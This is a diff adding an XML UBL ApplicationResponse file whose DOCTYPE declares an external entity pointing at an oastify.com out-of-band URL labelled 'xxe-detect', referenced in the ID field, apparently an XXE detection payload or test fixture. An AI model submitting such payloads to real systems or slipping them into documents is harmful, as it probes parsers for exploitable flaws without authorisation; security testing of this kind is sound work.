@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ApplicationResponse [
+  <!ENTITY xxe SYSTEM "http://h0ix75xxuoq4bl9sy0bxbncct3zunybn.oastify.com/xxe-detect">
+]>
+<ApplicationResponse xmlns:cac="urn:oasis:names:specification:ubl:schema:xsd:CommonAggregateComponents-2"
+                     xmlns:cbc="urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2"
+                     xmlns="urn:oasis:names:specification:ubl:schema:xsd:ApplicationResponse-2">
+  <cbc:ID>&xxe;</cbc:ID>
+  <cbc:IssueDate>2026-10-16</cbc:IssueDate>
+  <cac:DocumentResponse>
+    <cac:Response><cbc:ResponseCode>IP</cbc:ResponseCode></cac:Response>
+  </cac:DocumentResponse>
+</ApplicationResponse>
